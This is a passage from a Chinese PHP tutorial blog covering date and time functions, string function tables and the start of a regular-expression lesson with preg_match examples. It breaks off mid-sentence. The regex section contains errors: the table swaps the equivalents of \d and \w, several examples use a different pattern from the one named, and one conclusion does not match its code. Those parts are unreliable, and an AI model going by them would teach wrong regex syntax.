 代表年 ——亚m &emsp;英文代表month，为月份  代表月 ——麻d &emsp;英文代表day， 为日期   代表日 ——跌H:i:s &emsp;代表的是：时分秒h &emsp;的英文为：hour 代表小时i&emsp; 的英文为：minute 代表分钟s&emsp; 的英文为：second 代表秒\n\n所以我们需要输出前前的年份，月份，日期的话。例如：1997年7月1日，我们就可以用到上面的三个参数。\n&lt;?php\n\necho date('Y年m月d日');\n?>\n\n2019年02月17日\n\n&emsp;写全了就是：\n&lt;?php\n\n//就可以显示出来当前的时间了哟。\necho date('Y-m-d H:i:s');\n?>\n\n&emsp;\ndate函数用于将一个时间进行格式化输出，以方便时间的显示或存储。其语法格式如下：string date ( string $forrnat [, int $timestamp] )在参数列表中:$timestamp是一个时间戳，函数将这个时间戳按$format规定的格式输出。如果$timestamp没有输入值，则默认为当前的时间。$format是一个时间输出格式的字符串，需要使用规定的字符构造输出格式。\n\n&emsp;\ndate函数的格式参数表：\n\n\n\n\n字符\n说明\n返回值\n\n\n\n\nd\n月份中的第几天，有前导零的2位数字\n01到31\n\n\nD\n英文星期几，3个字母\nMon到Sun\n\n\nj\n月份中的第几天，没有前导零\n1到31\n\n\nl(字母)\n英文星期几\nSunday到 Saturday\n\n\nN\n1格式数字表示的星期\n1（表示星期一）到7（表示星期天)\n\n\nS\n每月天数后面的英文后缀，2个字符\nst，nd，rd或者th。可以和jg一起用\n\n\nw\n星期中的第几天，数字表示\n0（表示星期天）到 6（表示星期六）\n\n\nz\n一年中的第几天\n0到366\n\n\nW\n年份中的第几周，每周从星期一开始\n42（当年的第42周）\n\n\nF\n月份，完整的文本格式\nJanuary 到 December\n\n\nm\n数字表示月份，有前导零\n01 到 12\n\n\nM\n3个字母缩写表示的月份\nJan 到Dec\n\n\nn\n数字表示月份，没有前导零\n1 到 12\n\n\nt\n给定月份所应有的天数\n28 到 31\n\n\nL\n是否为闰年\n如果是闰年为1，否则为o\n\n\no\n格式年份数字\n例如2007\n\n\nY\n4 位数字完整表示年份\n例如1999或2008\n\n\ny\n2 位数字表示的年份\n例如99或08\n\n\na\n小写的上午和下午值\nam或pm\n\n\nA\n大写的上午和下午值\nAM或PM\n\n\ng\n小时，12小时格式，没有前导零\n1到12\n\n\nG\n小时，24小时格式，没有前导零\n0 到 23\n\n\ni\n有前导零的分钟数\n00 到 59\n\n\ns\n秒数，有前导零\n00到59\n\n\ne\n时区标识    \n\n\nU\n从Unix纪元开始至今的秒数\n长整型数字\n\n\n\n&emsp;\n4. getdate获取当前系统时间getdate用来获取当前系统的时间，或者获得一个时间戳的具体含义。时间戳是一个长整数，表示getdate的语法格式如下所示。array getdate ([ int $timestamp = time() ] )函数的返回值是一个根据timestamp得到的包含有时间信息的数组。如果没有参数，则会返回当前的时间。getdate返回的数组，键名包括时间和日期的完整信息。\n\n\n\n\n键名\n说明\n返回值\n\n\n\n\nsecnods\n秒\n数字0到 59\n\n\nminutes\n分钟\n数字0到59\n\n\nhours\n小时\n数字 0到 23\n\n\nmday\n月份中第几天    数字\n1到 31\n\n\nwday\n星期中第几天    数字\n0（表示星期天）到6（表示星期六）\n\n\nmon\n月份\n数字 1 到 12\n\n\nyear\n年\n4 位数字表示的完整年份\n\n\nyday\n一年中第几天    数字\n0到365\n\n\nweekday\n星期几的英文\nSunday到 Saturday\n\n\nmonth\n月份的英文\nJanuary 到 December\n\n\n0\n自从Unix纪元开始的秒数\n长整型数字\n\n\n\n&emsp;以下代码可以返回getdate 数组的详细信息。\n&lt;?php\n   $mytime=getdate(); \n   print_r( $mytime);\n?>\n\n&emsp;print_r可以输出一个数组中所有的键名与值。运行这段代码，结果如下所示。程序输出当前计算机的时间与日期详细信息：\nArray\n(\n    [seconds] => 1            //秒\n    [minutes] => 10            //分钟\n    [hours] => 17            //小时\n    [mday] => 18            //日\n    [wday] => 0            //星期中的第几天\n    [mon] => 1            //月\n    [year] => 2015            //年\n    [yday] => 17            //年中的第几天\n    [weekday] => Sunday        //星期\n    [month] => January        //月份\n    [0] => 1421597401        //时间戳\n)\n\n&emsp;\n↓↓理解了getdate函数和返回的数组以后，就很容易取得当前的时间信息了。下面的代码就是用getdate函数取得时间信息，调用返回时间数组的值输出时间信息。\n\n&lt;?php \n$mytime = getdate();\necho \"年 :\".$mytime['year'].\"\\n\";\necho \"月 :\".$mytime['mon'].\"\\n\";\necho \"日 :\".$mytime['mday'].\"\\n\";\necho \"时 :\".$mytime['hours'].\"\\n\";\necho \"分 :\".$mytime['minutes'].\"\\n\";\necho \"秒 :\".$mytime['seconds'].\"\\n\";\necho \"一个小时中的第几钟 :\".$mytime['minutes'].\"\\n\";\necho \"这是一分钟的第几秒 :\".$mytime['seconds'].\"\\n\";\necho \"星期名称 :\".$mytime['weekday'].\"\\n\";\necho \"月份名称 :\".$mytime['month'].\"\\n\";\necho \"时间戳   :\".$mytime[0].\"\\n\";\n?>\n\n运行结果：\n年 :2019 \n月 :2 \n日 :17 \n时 :5 \n分 :39 \n秒 :34 \n一个小时中的第几钟 :39 \n这是一分钟的第几秒 :34 \n星期名称 :Sunday \n月份名称 :February \n时间戳 :1550381974\n\n&emsp;\n5. 日期验证函数checkdate可以判断一个输出的日期是否有效。在实际的工作中，我们需要经常用于检测常用于用户提交表单的数据验证。例如：验证用户输入的时间是否正确。函数的语法格式如下：bool checkdate ( int $month , int $day , int $year )&emsp;\n\n\n&lt;?php\nvar_dump(checkdate(12, 31, 2018));\nvar_dump(checkdate(2, 29, 2011));\n?>\n输出结果：\n\nbool(true)\nbool(false)\n\n&emsp;\n6.获取本地化时间戳函数 mktime()函数、strtotime()函数。[注：使用方法]\n\n\n&emsp;&emsp;\n2.5  检测程序执行时间我们有的时经常需要做程序的执行时间执行效率判断。实现的思路如下：\n\n&lt;?php\n//记录开始时间\n\n\n\n//记录结整时\n\n\n// 开始时间  减去（-）  结束时间  得到程序的运行时间\n\n?>\n\n&emsp;&emsp;\n可是不要忘了，程序的运行速度太快了。快到只有0.00000几秒的一刹那。那这个时候大家要记录一个特函的函数了：mixed microtime ([ bool $get_as_float ] )microtime()这个函数，能够返回当前 Unix 时间戳和微秒数。\n\n\n参数：如果你传入true的话，将会返回一个浮点类型的时间，这样方便参与运算。\n\n模拟一个检测函数执行时间的例子，测试某个函数效率的快慢：\n&lt;?php\n//开始时间\n$time_start = microtime(true);\n\n//循环一万次\nfor($i = 0 ; $i &lt; 10000 ; $i++){\n   //你可以用上，mktime() 生成一个昨天的时间\n   //再用strtotime() 生成一个昨天的时间\n   //对比两个函数认的效率高\n}\n//结整时间\n$time_end = microtime(true);\n//相减得到运行时间\n$time = $time_end - $time_start;\necho \"这个脚本执行的时间为 $time seconds\\n\";\n?>\n\n运行结果：\n这个脚本执行的时间为 0.00016498565673828 seconds\n\n\n最后输出的结果就是我们实际的函数的执行时间。你可以多对比几次，看看最终的结果。谁的时间短，在实际的工作中，你就可以经常使用哪个函数。\n\n&emsp;&emsp;\n2.6  字符串常用函数数组、字符串和数据库是我们函数里面最、最、最常用的三类函数。当然PHP的字符串函数也有很多。我们最常使用的两个系列的字符串：    1.单字节字符串处理函数    2.多字节字符串处理函数    3.字符串编码转换函数\n\n\n我们来说说为什么要学这么多函数：    1.我们学的是中文，是双字节或者三字节的。老外的函数只能处理英文和数字这些单字节的字符串处理不鸟中文。达不到我们的功能需求    2.有的时候需要做不同字符编码间的转换，例如：把GBK的转为UTF-8    3.英文这些字符在电脑里又是必须要处理的\n\n&emsp;\n\n中文主要用的是GBK和utf-8两种编码格式。GBK和utf-8是两个不同的编码委员会对于汉字进行的编码的标准。他们规定GBK是双字节，也就是一个汉字占用2Bytes。utf-8是三字节，一个汉字占用三个字节长度的存储空间。\n\n&emsp;\nPHP常用函数：\n\n\n\n\n函数名\n描述\n实例\n\n\n\n\ntrim()\n删除字符串两端的空格或其他预定义字符\n“$str = “\\r\\nHello World!\\r\\n”; echo trim($str);\n\n\nrtrim()\n删除字符串右边的空格或其他预定义字符\n“$str = “Hello World!\\n\\n”; echo rtrim($str);”\n\n\nchop()\nrtrim()的别名\n同上\n\n\nltrim()\n删除字符串左边的空格或其他预定义字符\n“$str = “\\r\\nHello World!”; echo ltrim($str);”\n\n\ndirname()\n回路径中的目录部分（我们把它归在了字符串函数里了）\necho dirname(“c:/testweb/home.php”);\n\n\nstr_pad()\n把字符串填充为指定的长度\n$str = “Hello World”; echo str_pad($str,20,”.”);\n\n\nstr_repeat()\n重复使用指定字符串\necho str_repeat(“.”,13);\n\n\nstr_split()\n把字符串分割到数组中\nprint_r(str_split(“Hello”));\n\n\nstrrev()\n反转字符串\necho strrev(“Hello World!”);\n\n\nwordwrap()\n按照指定长度对字符串进行折行处理\n“$str = “”An example on a long word is: Supercalifragulistic””; echo wordwrap($str,15);”\n\n\nstr_shuffle()\n随机地打乱字符串中所有字符\necho str_shuffle(“Hello World”);\n\n\nparse_str()\n将字符串解析成变量\n“parse_str(“id=23&amp;name=John%20Adams”,$myArray); print_r($myArray);”\n\n\nnumber_format()\n通过千位分组来格式化数字\n“echo number_format(“1000000”); echo number_format(“1000000”,2); echo number_format(“1000000”,2,””,””,””.””);”\n\n\nstrtolower()\n字符串转为小写\necho strtolower(“Hello WORLD!”);\n\n\nstrtoupper()\n字符串转为大写\necho strtoupper(“Hello WORLD!”);\n\n\nucfirst()\n字符串首字母大写\necho ucfirst(“hello world”);\n\n\nucwords()\n字符串每个单词首字符转为大写\necho ucwords(“hello world”);\n\n\nhtmlentities()\n把字符转为HTML实体\n$str = “”John &amp; ‘Adams’””; echo htmlentities($str, ENT_COMPAT);\n\n\nhtmlspecialchars()\n预定义字符转html编码    \n\n\nnl2br()\n\\n转义为标签\necho nl2br(“One line.\\nAnother line.”);\n\n\nstrip_tags()\n剥去 HTML、XML 以及 PHP 的标签\necho strip_tags(“Hello world!”);\n\n\naddcslashes()\n在指定的字符前添加反斜线转义字符串中字符\n$str = “”Hello, my name is John Adams.” echo $str; echo addcslashes($str,’m’);”\n\n\nstripcslashes()\n删除由addcslashes()添加的反斜线\necho stripcslashes(“Hello, \\my na\\me is Kai Ji\\m.”);\n\n\naddslashes()\n指定预定义字符前添加反斜线\n$str = “Who’s John Adams?”;echo addslashes($str);\n\n\nstripslashes()\n删除由addslashes()添加的转义字符\necho stripslashes(“Who\\’s John Adams?”);\n\n\nquotemeta()\n在字符串中某些预定义的字符前添加反斜线\n$str = “Hello world. (can you hear me?)”; echo quotemeta($str);\n\n\nchr()\n从指定的 ASCII 值返回字符\necho chr(052);\n\n\nord()\n返回字符串第一个字符的 ASCII值\necho ord(“hello”);\n\n\nstrcasecmp()\n不区分大小写比较两字符串\necho strcasecmp(“Hello world!”,”HELLO WORLD!”);\n\n\nstrcmp()\n区分大小写比较两字符串    \n\n\nstrncmp()\n比较字符串前n个字符,区分大小写    \n\n\nstrncasecmp()\n比较字符串前n个字符,不区分大小写\nint strncasecmp ( string $str1 , string $str2 , int $len )\n\n\nstrnatcmp()\n自然顺序法比较字符串长度,区分大小写\nint strnatcmp ( string $str1 , string $str2 )\n\n\nstrnatcasecmp()\n自然顺序法比较字符串长度,不区分大小写\nint strnatcasecmp ( string $str1 , string $str2 )\n\n\nchunk_split()\n将字符串分成小块\nstr chunk_split(str $body[,int $len[,str $end]])\n\n\nstrtok()\n切开字符串\nstr strtok(str $str,str $token)\n\n\nexplode()\n使用一个字符串为标志分割另一个字符串\narray explode(str $sep,str $str[,int $limit])\n\n\nimplode()\n同join,将数组值用预订字符连接成字符串\nstring implode ( string $glue , array $pieces )\n\n\nsubstr()\n截取字符串\nstring substr ( string $string , int $start [, int $length ] )\n\n\nstr_replace()\n字符串替换操作,区分大小写\nmix str_replace(mix $search,,mix $replace,mix $subject[,int &amp;$num])\n\n\nstr_ireplace()\n字符串替换操作,不区分大小写\nmix str_ireplace ( mix $search , mix $replace , mix $subject [, int &amp;$count ] )\n\n\nsubstr_count()\n统计一个字符串,在另一个字符串中出现次数\nint substr_count ( string $haystack , string $needle [, int $offset = 0 [, int $length ]] )\n\n\nsubstr_replace()\n替换字符串中某串为另一个字符串\nmixed substr_replace ( mixed $string , string $replacement , int $start [, int $length ] )\n\n\nsimilar_text()\n返回两字符串相同字符的数量\nint similar_text(str $str1,str $str2)\n\n\nstrchr()\n返回一个字符串在另一个字符串中开始位置到结束的字符串\nstring strstr ( string $str, string $needle , bool $before_needle )\n\n\nstrrchr()\n返回一个字符串在另一个字符串中最后一次出现位置开始到末尾的字符串\nstring strrchr ( string $haystack , mixed $needle )\n\n\nstristr()\n返回一个字符串在另一个字符串中开始位置到结束的字符串，不区分大小写\nstring stristr ( string $haystack , mixed $needle [, bool $before_needle = false ] )\n\n\nstrtr()\n转换字符串中的某些字符\nstring strtr ( string $str , string $from , string $to )\n\n\nstrpos()\n寻找字符串中某字符最先出现的位置\nint strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )\n\n\nstripos()\n寻找字符串中某字符最先出现的位置,不区分大小写\nint stripos ( string $haystack , string $needle [, int $offset ] )\n\n\nstrrpos()\n寻找某字符串中某字符最后出现的位置\nint strrpos ( string $haystack , string $needle [, int $offset = 0 ] )\n\n\nstrripos()\n寻找某字符串中某字符最后出现的位置,不区分大小写\nint strripos ( string $haystack , string $needle [, int $offset ] )\n\n\nstrspn()\n返回字符串中首次符合mask的子字符串长度\nint strspn ( string $str1 , string $str2 [, int $start [, int $length ]] )\n\n\nstrcspn()\n返回字符串中不符合mask的字符串的长度\nint strcspn ( string $str1 , string $str2 [, int $start [, int $length ]] )\n\n\nstr_word_count()\n统计字符串含有的单词数\nmix str_word_count(str $str,[])\n\n\nstrlen()\n统计字符串长度\nint strlen(str $str)\n\n\ncount_chars()\n统计字符串中所有字母出现次数(0..255)\nmixed count_chars ( string $string [, int $mode ] )\n\n\nmd5()\n字符串md5编码\n$str = “Hello”; echo md5($str)\n\n\niconv：\n\n\n\nmb_substr\n获取字符串的部分\nstring mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] )\n\n\nmb_http_output\n设置/获取 HTTP 输出字符编码\nmixed mb_http_output ([ string $encoding = mb_http_output() ] )\n\n\nmb_strlen\n获取字符串的长度\nmixed mb_strlen ( string $str [, string $encoding = mb_internal_encoding() ] )\n\n\niconv\n字符串按要求的字符编码来转换\nstring iconv ( string $in_charset , string $out_charset , string $str )\n\n\niconv_substr\n截取字符串的部分    \n\n\niconv_get_encoding\n获取 iconv 扩展的内部配置变量    \n\n\nmb_substr_count\n统计字符串出现的次数    \n\n\nmb_check_encoding\n检查字符串在指定的编码里是否有效    \n\n\nmb_strrpos\n查找字符串在一个字符串中最后出现的位置    \n\n\nmb_split\n使用正则表达式分割多字节字符串    \n\n\nparse_url\n解释URL成为一个数组    \n\n\n\n","thumbnail":"https://i.loli.net/2019/02/21/5c6e422e83744.jpg","plink":"https://Directoree.github.io/post/PHP-function/"},{"title":"PHP-正则表达式","date":"2019-02-14T13:40:36.000Z","updated":"2019-03-08T14:54:07.878Z","content":"世界上最难懂的是道士的鬼符、医生的处方和程序员的正则表达示。(ง •_•)ง\n&ensp;&ensp;\nPHP 正则表达式\n\n&emsp;&emsp;\n正则表达示我们其实之前经常看到，它主要用在以下一些地方：1.匹配邮箱、手机号码、验证码2.替换敏感的关键词。例如：涉及政治和骂人的话3.文章采集。4.早期的表情替换技术,ubb文件编码、markdown编辑器替换等5.以后自己写模板引擎也需要用到正则表达示其他….\n\n\n正则表达式是一种描述字符串结果的语法规则，是一个特定的格式化模式，可以匹配、替换、截取匹配的字符串。常用的语言基本上都有正则表达式，如JavaScript、java等。其实，只有了解一种语言的正则使用，其他语言的正则使用起来，就相对简单些。文本主要围绕解决下面问题展开。\n\n\n\n1. 定界符定界符，就是定一个边界，边界以内的就是正则表达示。PHP的正则表达示定界符的规定如下：定界符，不能用a-zA-Z0-9\\ 其他的都可以用。必须成对出现，有开始就有结束。我们来例几个例子：\n\n\n\n\n例子\n说明\n\n\n\n\n/中间写正则/\n正确\n\n\n$中间写正则$\n正确\n\n\n%中间写正则%\n正确\n\n\n^中间写正则^\n正确\n\n\n@中间写正则@\n正确\n\n\n#中间写正则#\n正确\n\n\n(中间写正则)\n错误\n\n\nA中间写正则A\n错误\n\n\n\n&emsp;&emsp;\n 2. 转义字符 注：\\ 是转义字符，如果在以后正则表达示里面需要匹配/，如下：/ / /这个时候真要匹配/ 的时候，需要把定界符里面的/ 用转义字符转义一下，写成下面的例子：/ \\/ /如果你觉得麻烦，遇到这种需要转义的字符的时候可以把两个正斜线（/ /）定界，改为其他的定界符（# #）。\n\n&emsp;&emsp;\n 3. 原子 原子是正则表达示里面的最小单位，原子说白了就是需要匹配的内容。一个成立的正则表达示当中必须最少要有一个原子。所有可见不可见的字符就是原子！说明：我们见到的空格、回车、换行、0-9、A-Za-z、中文、标点符号、特殊符号全为原子。在做原子的实例前我们先来讲解一个函数,preg_match:int preg_match ( string $正则 , string $字符串 [, array &amp;$结果] )功能：根据$正则变量，匹配$字符串变量。如果存在则返回匹配的个数，把匹配到的结果放到$结果变量里。如果没有匹配到结果返回0。注：上面是preg_match常用的主要几个参数。我在上面将另外几个参数没有列出来。因为，另外两个参数太不常用了。我们来通过实验来证明：\n\n(1)↓↓\n\n&lt;?php\n//定义一个变量叫zz，放正则表达示。为了方便大家记忆，如果你英文比较ok，建议把变量名还是写成\n//英文的$pattern。\n$zz = '/a/';\n$string = 'ddfdjjvi2jfvkwkfi24';\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n因为我希望的是匹配a，而$string当是是不存在a的，所以不成功。\n\n(2)↓↓\n\n&lt;?php\n$zz = '/wq/';\n$string = 'ssssswqaaaaaa';\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n上面的字符串中s后存在wq，因此匹配成功。\n\n接下来我们匹配一个空格试试：\n(3)↓↓\n\n&lt;?php\n$zz = '/ /';\n$string = 'sssssw aaaaa';\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配到了，结果为：array(1) { [0]=> string(1) \" \" }\n\n\n因上，$string这个变量的w字符后存在一个空格。所以匹配成功，输出了字符串类型，长度为1。只不过我们的肉眼不可见，看不到这个字符串而已。\n\n&emsp;\n4. 特殊标识的原子\n\n\n原子\n说明\n等价式\n\n\n\n\n\\d\n匹配一个0-9\n[a-zA-Z0-9_] \n\n\n\\D\n除了0-9以外的所有字符\n[^a-zA-Z0-9_]\n\n\n\\w\na-zA-Z0-9_\n[0-9]\n\n\n\\W\n除了0-9A-Za-z_以外的所有字符\n[^0-9]\n\n\n\\s\n匹配所有空白字符\\n \\t \\r 空格\n[ \\t\\n\\f\\r]\n\n\n\\S\n匹配所有非空白字符\n[^ \\t\\n\\f\\r]\n\n\n[ ]\n指定范围的原子\n\n\n\n\n这个个需要记住，最好达到默写级别。记忆的时候成对记忆，\\d是匹配一个0-9，那么\\D 就是除了0-9以外的所有字符。上面已经说明的很清楚了，我们进行实验一步一步对这些进行学习。\n\n&emsp;\n1. \\d匹配一个0-9\n\n&lt;?php\n$zz = '/\\d/';\n\n$string = '我爱喝9你爱不爱喝';\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n&emsp;\n2. \\D匹配一个非0-9的值\n\n&lt;?php\n$zz = '/\\D/';\n\n$string = '121243中23453453';\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配成功，匹配到了中。因为它不是0-9之间的字符。\n\n&emsp;\n3. \\w匹配一个a-zA-Z0-9_\n\n&lt;?php\n$zz = '/\\w/';\n\n$string = '新中_国万岁呀万岁';\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配成功，匹配到了下划线。\n\n&emsp;\n4. \\W匹配一个非a-zA-Z0-9_\n\n&lt;?php\n$zz = '/\\w/';\n\n$string = 'afasABCWEQR44231284737';\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配失败。因为，上面上面全是a-zA-Z0-9_，没有非a-zA-Z0-9_。\n\n&emsp;\n5. \\s 匹配所有空白字符\\n \\t \\r 空格\n\n&lt;?php\n$zz = '/\\s/';\n\n$string = \"中国万\n岁\";\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配成功，因为有一个回车。\n\n&emsp;\n6. \\S 非空字符\n\n&lt;?php\n$zz = '/\\s/';\n\n$string = \"        \n         a       \";\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配成功。虽然上面有空格，回车和缩进。但是，有一个非空白字符a。因此，匹配成功。\n\n&emsp;\n7. [] 指定范围的原子\n\n&lt;?php\n\n$zz = '/[0-5]\\w+/';\n\n$string = '6a';\n\n$string1 = '1C';\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n结论：上例中0-5匹配$string失败，而$string1成功。因为，$string中的第一个数值为6，不在[0-5]的范围之内。\n\n&lt;?php\n\n$zz = '/[a-zA-Z0-9_]\\w/';\n\n$string = 'ab';\n\n$string1 = '9A';\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n结论：$string和$string1都匹配成功。因为\\w就是[a-zA-Z0-9_]\n\n&lt;?php\n\n$zz = '/[abc]\\d+/';\n\n$string = 'a9';\n\n$string1 = 'b1';\n\n$string2 = 'c5';\n\n$string3 = 'd4';\n\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n结论：$string、$string1、$string2匹配成功，而$string3不成功。因为$string3超过了[abc]的范围，它是从d开始的。\n\n&emsp;\n8. [\\^ 字符] 不匹配指定区间的字符\n\n&lt;?php\n\n$zz = '/[^0-9A-Za-z_]/';\n\n$string = 'aaaaab311dd';\n\n$string1 = '!$@!#%$#^##';\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n\n?>\n\n\n结论：\n\n匹配$string不成功，但是匹配$string1的时候成功。因为中括号里面有个抑扬符。\n^ 抑扬符在中括号里面的作用是不准以中括号里面的字符进行匹配。\n\n\n&emsp;\n5. 元字符抛出问题：\\d 代表匹配一个字符。而我现在想要匹配十个八个，任意多个数字肿么办？这个时候我们就要用到元字符。在使用原子的时候，发现只能够匹配一个字符，可是要匹配多个字符就出现了问题。这个时候，我们需要借助元字符来帮我们修饰原子，实现更多的功能。\n\n\n\n\n元字符\n功能说明\n\n\n\n\n*\n是代表匹配前面的一个原子，匹配0次或者任意多次前面的字符。\n\n\n+\n匹配一次或多前前面的一个字符\n\n\n?\n前面的字符可有可无【可选】 有或没有\n\n\n.\n更标准一些应该把点算作原子。匹配除了\\n以外的所有字符\n\n\n丨\n或者。注：它的优先级最低了。\n\n\n^\n必须要以抑扬符之后的字符串开始\n\n\n$\n必须要以$之前的字符结尾\n\n\n\\b\n词边界\n\n\n\\B\n非边界\n\n\n{m}\n有且只能出现m次\n\n\n{n,m}\n可以出现n到m次\n\n\n{m,}\n至少m次，最大次数不限制\n\n\n()\n改变优先级或者将某个字符串视为一个整体，匹配到的数据取出来也可以使用它\n\n\n\n&emsp;\n1. + 匹配最少1次前面的字符\n\n&lt;?php\n$zz = '/\\d+/';\n\n$string = \"迪奥和奥迪250都是我最爱\";\n\n//待会儿再试试中间没有0-9的情况\n//$string = \"迪奥和奥迪都是我最爱\";\n\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配成功，证明了\\d+中的+。\\d是匹配数字，而+是最少匹配一次前面的字符。\n\n&emsp;\n2. * 匹配0次或者任意多次前面的字符\n\n&lt;?php\n$zz = '/\\w*/';\n\n$string = \"!@!@!!@#@!$@#!\";\n\n//待会儿再试试中间没有0-9的情况\n//$string1 = \"!@#!@#!abcABC#@#!\";\n\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n说明，注释掉的$string1和$string都匹配成功了。因为，\\w是匹配的0-9A-Za-z_，而*是说明前面的\\w可以不存在。如果存在可以有1个或者多个。\n\n&emsp;\n3. ? 前面的字符出现0次或者1次，可有可无\n\n&lt;?php\n\n$zz = '/ABC\\d?ABC/';\n\n$string = \"ABC1ABC\";\n\n//待会儿再试试中间没有0-9的情况\n//$string1 = \"ABC888888ABC\";\n//$string2 = \"ABCABC\";\n\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n匹配$string,$string2成功，但是匹配$string1失败。因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。\n\n&emsp;\n4. . (点) 匹配除\\n以外的所有字符\n\n&lt;?php\n\n$zz = '/gg.+gg/';\n\n$string = \"ABC1ABC\";\n\n\nif(preg_match($zz, $string, $matches)){\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n}else{\n   echo '没有匹配到';\n}\n?>\n\n\n匹配$string,$string2成功，但是匹配$string1失败。因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。\n\n&emsp;\n5. |（竖线），或者，优先级最低\n\n我们通过实验来看优先级和或者的匹配\n&lt;?php\n\n$zz = '/abc|bcd/';\n\n$string1 = \"abccd\";\n$string2 = \"ggggbcd\";\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n我们来看看：    1.最开始我匹配的想法是想匹配的是abccd或者是abbcd。可是，匹配$string1和$string2，匹配出来的结果却是abc和bcd.    2.实现了或者匹配，匹配出来了abc或者是bcd。它还没有字符串连续在一起的优先级高。\n那么问题来了，我要匹配上例中的abccd或者是abbcd怎么办？\n需要使用到()来改变优先级。\n\n&lt;?php\n\n$zz = '/ab(c|b)cd/';\n\n$string1 = \"起来abccd阅兵\";\n$string2 = \"ggggbcd\";\n$string3 = '中国abbcd未来';\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n运行结果：\n匹配到了，结果为：array(2) { [0]=> string(5) \"abccd\" [1]=> string(1) \"c\" }\n\n\n结论：   1.确实匹配了了abccd或者abbcd（$string1 or $string3）。   2.但是匹配的数组里面多了一个元素，这个元素的下标为1   3.()中的内容只要匹配成功，会把匹配到的数据放到下标为1的这个数组元素中。\n\n&emsp;\n6. ^ （抑扬符），必须要以^之后的字符串开始\n\n&lt;?php\n\n$zz = '/^猪哥好帅\\w+/';\n\n$string1 = \"猪哥好帅abccdaaaasds\";\n//$string2没有以猪哥好帅开始\n$string2 = \"帅abccdaaaasds\";\n\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n通过实验发现以下结论：   1.$string1匹配成功，$string2没有匹配成功   2.因为$string1是以指定的字符开始的   3.而$string2并没有以^之后的字符开始   4.翻译这个正则的意思就是：以要猪哥好帅开始后面接a-zA-Z0-9_最少一个字符。\n\n&emsp;\n7. $ （美元符）必须要以$之前的字符结束\n\n&lt;?php\n\n$zz = '/\\d+努力$/';\n\n$string1 = \"12321124333努力\";\n//$string2\n$string2 = \"12311124112313力\";\n\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n我们运行一下看一下结果，得出来的结论：   1.$string1 匹配成功，而$string2匹配不成功   2.$之前的字符是\\d+，后面接着中文的努力。   3.因此，匹配的是这一个整体。\\d指的是0-9的整型,+号代表最少一个0-9\n\n&emsp;\n8. \\b和\\B 词边界和非词边界\n\n我们来讲解什么是边界：\n   1.正则表达示是有边界的，这个边界是定界符的开始和结尾是正则的边界。\n   2.this是一个英文单词，后面加上一个空格，意味着这个词结束了，到达了这个词的边界\n\\b词边界，就是指必须要在最前或者最后。\\B非边界，就是不能在一个正则表达示的最前或者最后。\n&lt;?php\n\n$zz = '/\\w+\\b/';\n\n$string1 = \"this is a apple\";\n$string2 = \"thisis a apple\";\n$string3 = \"thisisaapple\";\n\nif (preg_match($zz, $string1, $matches)) {\n   echo '匹配到了，结果为：';\n   var_dump($matches);\n} else {\n   echo '没有匹配到';\n}\n?>\n\n\n结论：   1.$string1、$string2和$string3都匹配成功。   2.$string1匹配的时候this 空格是边界   3.$string2匹配的时候thisis是边界   